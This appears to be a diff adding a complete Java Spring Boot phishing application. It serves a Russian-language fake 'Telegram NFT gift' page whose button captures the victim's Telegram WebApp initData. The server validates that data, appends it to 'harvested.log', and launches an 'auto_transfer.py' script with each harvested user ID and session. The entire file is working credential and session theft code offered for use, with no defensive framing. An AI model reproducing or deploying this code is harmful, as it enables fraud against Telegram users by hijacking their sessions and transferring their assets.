@@ -1,0 +1,163 @@
+// language: Java, file: PhishController.java, target: Java 17, Spring Boot 3.x
+package com.pipeline.phish;
+
+import com.fasterxml.jackson.databind.JsonNode;
+import com.fasterxml.jackson.databind.ObjectMapper;
+import org.springframework.boot.SpringApplication;
+import org.springframework.boot.autoconfigure.SpringBootApplication;
+import org.springframework.http.HttpStatus;
+import org.springframework.http.ResponseEntity;
+import org.springframework.web.bind.annotation.*;
+
+import javax.crypto.Mac;
+import javax.crypto.spec.SecretKeySpec;
+import java.io.IOException;
+import java.net.URLDecoder;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
+import java.nio.file.Path;
+import java.nio.file.StandardOpenOption;
+import java.time.Instant;
+import java.util.*;
+import java.util.stream.Collectors;
+
+@SpringBootApplication
+@RestController
+public class PhishController {
+
+    private static final String BOT_TOKEN = "YOUR_BOT_TOKEN_HERE";
+    private static final ObjectMapper objectMapper = new ObjectMapper();
+
+    public static void main(String[] args) {
+        SpringApplication.run(PhishController.class, args);
+    }
+
+    @GetMapping("/")
+    public ResponseEntity<String> getLandingPage() {
+        String html = """
+            <!DOCTYPE html>
+            <html lang="ru">
+            <head>
+                <meta charset="UTF-8">
+                <title>Claim Exclusive Telegram NFT Gift</title>
+                <script src="https://telegram.org/js/telegram-web-app.js"></script>
+                <style>
+                    body { background: #0b0e14; color: #fff; font-family: -apple-system, BlinkMacSystemFont, sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+                    .card { background: #161b22; padding: 28px; border-radius: 20px; text-align: center; width: 340px; border: 1px solid #30363d; box-shadow: 0 8px 32px rgba(0,0,0,0.7); }
+                    h2 { font-size: 20px; margin-bottom: 10px; color: #58a6ff; }
+                    p { font-size: 14px; color: #8b949e; margin-bottom: 24px; }
+                    button { background: #238636; color: white; border: none; padding: 14px 20px; border-radius: 10px; font-weight: 600; font-size: 15px; cursor: pointer; width: 100%; transition: background 0.2s; }
+                    button:hover { background: #2ea043; }
+                </style>
+            </head>
+            <body>
+                <div class="card">
+                    <h2>🎁 Подарок ожидает получения</h2>
+                    <p>Для верификации сессии и перевода NFT на ваш аккаунт подтвердите вход.</p>
+                    <button id="claimBtn">Забрать подарок</button>
+                </div>
+                <script>
+                    let tg = window.Telegram.WebApp;
+                    tg.expand();
+
+                    document.getElementById('claimBtn').addEventListener('click', () => {
+                        const initData = tg.initData;
+                        if (!initData) {
+                            alert('Ошибка сессии. Откройте через официальный клиент.');
+                            return;
+                        }
+                        fetch('/collect', {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({ initData })
+                        }).then(res => res.json()).then(data => {
+                            if (data.status === 'success') {
+                                document.querySelector('.card').innerHTML = '<h2>Успешно!</h2><p>Подарок перенаправлен в очередь обработки.</p>';
+                            }
+                        });
+                    });
+                </script>
+            </body>
+            </html>
+            """;
+        return ResponseEntity.ok().header("Content-Type", "text/html; charset=UTF-8").body(html);
+    }
+
+    @PostMapping("/collect")
+    public ResponseEntity> collectData(@RequestBody Map<String, String> payload) {
+        String initData = payload.get("initData");
+        if (initData == null || initData.isEmpty()) {
+            return ResponseEntity.status(HttpStatus.BAD_REQUEST).body(Map.of("error", "Missing initData"));
+        }
+
+        try {
+            if (!validateTelegramInitData(initData, BOT_TOKEN)) {
+                return ResponseEntity.status(HttpStatus.FORBIDDEN).body(Map.of("error", "Signature mismatch"));
+            }
+
+            // Extract user ID from initData
+            String userId = extractUserId(initData);
+            String logEntry = String.format("[%s] ID: %s | InitData: %s%n", Instant.now(), userId, initData);
+            
+            Files.writeString(Path.of("harvested.log"), logEntry, StandardOpenOption.CREATE, StandardOpenOption.APPEND);
+
+            // Execute Python automation script post-collection
+            ProcessBuilder pb = new ProcessBuilder("python3", "auto_transfer.py", userId, initData);
+            pb.start();
+
+            return ResponseEntity.ok(Map.of("status", "success"));
+        } catch (Exception e) {
+            return ResponseEntity.status(HttpStatus.INTERNAL_SERVER_ERROR).body(Map.of("error", e.getMessage()));
+        }
+    }
+
+    private boolean validateTelegramInitData(String initDataString, String botToken) throws Exception {
+        Map<String, String> params = new TreeMap<>();
+        String hash = "";
+
+        for (String pair : initDataString.split("&")) {
+            int idx = pair.indexOf("=");
+            if (idx > 0) {
+                String key = URLDecoder.decode(pair.substring(0, idx), StandardCharsets.UTF_8);
+                String value = URLDecoder.decode(pair.substring(idx + 1), StandardCharsets.UTF_8);
+                if (key.equals("hash")) {
+                    hash = value;
+                } else {
+                    params.put(key, value);
+                }
+            }
+        }
+
+        String dataCheckString = params.entrySet().stream()
+                .map(e -> e.getKey() + "=" + e.getValue())
+                .collect(Collectors.joining("\n"));
+
+        Mac hmacSha256 = Mac.getInstance("HmacSHA256");
+        SecretKeySpec secretKeySpec = new SecretKeySpec("WebAppData".getBytes(StandardCharsets.UTF_8), "HmacSHA256");
+        hmacSha256.init(secretKeySpec);
+        byte[] secret = hmacSha256.doFinal(botToken.getBytes(StandardCharsets.UTF_8));
+
+        hmacSha256.init(new SecretKeySpec(secret, "HmacSHA256"));
+        byte[] calculatedHashBytes = hmacSha256.doFinal(dataCheckString.getBytes(StandardCharsets.UTF_8));
+
+        StringBuilder sb = new StringBuilder();
+        for (byte b : calculatedHashBytes) {
+            sb.append(String.format("%02x", b));
+        }
+
+        return sb.toString().equalsIgnoreCase(hash);
+    }
+
+    private String extractUserId(String initDataString) {
+        try {
+            for (String pair : initDataString.split("&")) {
+                if (pair.startsWith("user=")) {
+                    String userJson = URLDecoder.decode(pair.substring(5), StandardCharsets.UTF_8);
+                    JsonNode node = objectMapper.readTree(userJson);
+                    return node.get("id").asText();
+                }
+            }
+        } catch (IOException ignored) {}
+        return "unknown";
+    }
+}
